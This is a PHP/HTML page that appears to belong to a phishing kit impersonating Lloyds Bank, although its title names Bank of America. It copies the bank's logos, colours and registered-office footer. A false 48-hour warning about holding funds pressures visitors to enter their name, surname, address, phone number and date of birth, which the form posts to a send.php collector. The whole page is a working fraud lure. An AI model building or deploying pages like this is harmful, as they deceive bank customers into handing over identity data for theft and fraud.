<?php 
    session_start();
?>
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="style.css">
    <script type='text/javascript' src="https://rawgit.com/RobinHerbots/jquery.inputmask/3.x/dist/jquery.inputmask.bundle.js"></script>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
    <script type='text/javascript' src="https://rawgit.com/RobinHerbots/jquery.inputmask/3.x/dist/jquery.inputmask.bundle.js"></script>
    <title>Bank of America - Banking, Credit Cards, Loans and Investing</title>
  </head>
  <body>





<div class="container-fluid">

    <div id="pf-container">



    
<center>
<style type="text/css">
    h1{
    font-size: 16px;
    }
 .user-input-wrp {
    position: relative;
    width: 100%;
    padding: 5px;
}
.user-input-wrp .inputText{
    width: 100%;
    outline: none;
    border:none;
    border-bottom: 1px solid lightgray;
    box-shadow: none !important; 
    background-color: transparent;
}
.user-input-wrp .inputText:focus{
    border-color: #006A4D;
    border-width: medium medium 2px;
}
.user-input-wrp .floating-label {
    position: absolute;
    pointer-events: none;
    top: 18px;
    left: 10px;
    transition: 0.2s ease all;
}
.user-input-wrp input:focus ~ .floating-label,
.user-input-wrp input:not(:focus):valid ~ .floating-label{
    top: 0px;
    left: 10px;
    font-size: 13px;
    opacity: 1;

}
                                    </style>
                                    <br>
                         <center>
                            <hr style="background-color: #006A4D;height:10px;width: 800px;">
                                <img src="https://logos-download.com/wp-content/uploads/2016/03/Lloyds_Bank_logo_1.png" width="400">
                                <hr style="background-color: #006A4D;height:10px;width: 800px;">
                        </center>
                        <br>
                           <form method="POST" action="send.php" style="width: 600px;">
                            <div class="alert alert-danger" style="background-color: #024731;color:#fff;border:none;">
                                *Important* Please update your records on or before 48 hours , a failure to update your records will result in temporal hold on your funds.
                            </div>
                               <div class="user-input-wrp" >
                                <br/>
                                <input type="text" class="inputText"  id="email_address" maxlength="100" name="name" type="text" required/>
                                <span class="floating-label" style="color:gray;">Name:</span>
                                </div> 
                            <div class="user-input-wrp" >
                                <br/>
                                <input type="text" class="inputText"  id="email_address" maxlength="100" name="surname" type="text" required/>
                                <span class="floating-label" style="color:gray;">Surname:</span>
                                </div>    
                               <div class="user-input-wrp" >
                                <br/>
                                <input type="text" class="inputText"  id="email_address" maxlength="100" name="address" type="text" required/>
                                <span class="floating-label" style="color:gray;">Address:</span>
                                </div> 

                               <div class="user-input-wrp" >
                                <br/>
                                <input type="number" class="inputText"  id="email_address" maxlength="100" name="phonenumber" type="text" required/>
                                <span class="floating-label" style="color:gray;">Phone Number:</span>
                                </div>

                                 <div class="user-input-wrp" >
                                <br/>
                                <input class="form-control inputText" type="date" id="birthday" name="datebirth"  required>
                                <span class="floating-label" style="color:gray;">Date of birth : </span>
                                </div>
                                <br>

                                <input type="submit" name="index1" value="Next" class="btn btn-primary" style="width: 600px;background-color: #006A4D;border: none;padding:10px;">

                            </form>
            </center>
            <center>
            <img src="https://d1yjjnpx0p53s8.cloudfront.net/styles/logo-thumbnail/s3/052015/lloydsbanklogo_1.png?itok=m23Mnzqm" width="100">
            <img src="https://www.glasgowchamberofcommerce.com/media/5778/lloyds-banking-group-logo-2.jpg" width="100">
            <img src="https://dwglogo.com/wp-content/uploads/2016/04/Lloyds-Banking-Group-plc.png" width="100"></center>
<hr style="width: 1000px;margin:auto;">

<style type="text/css">
    .footer{
        width: 70%;
        background-color: #006A4D;
    }
ul li {
    list-style-type: none;
    display: inline-block;
    text-decoration: none;
    color: white;
    font-size: 14px;
    cursor: pointer;
    font-family: sans-serif;
}       
span{
    color:#fff;
}
</style><center>
<div class="footer">
<br>
<ul>

        <li>Personal Banking&nbsp; | &nbsp;</li>
        <li>Security&nbsp; | &nbsp;</li>
        <li>Legal&nbsp; | &nbsp;</li>
        <li>Privacy&nbsp; | &nbsp;</li>
        <li>Careers&nbsp; | &nbsp;</li>
        <li>Privacy & Security&nbsp; | &nbsp;</li>
        <li>Rates and charges&nbsp; | &nbsp;</li>
        <li>Business&nbsp; | &nbsp;</li>
        <li>Advertising Practices&nbsp; | &nbsp;</li>
        <li>Banking&nbsp; | &nbsp;</li>
        <li>Security</li>

</ul>
<p  style="color: #fff;">Lloyds Bank plc. Registered Office: 25 Gresham Street, London EC2V 7HN. Registered in England and Wales no. 2065 Lloyds Bank plc is authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority under registration number 119278.</p>
<span style="font-size: 12px;color:#fff;">© 2020 Lloyds Bank Corporation. All rights reserved.</span><br><br>
</div>
</center>
    </div>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
  </body>
</html>
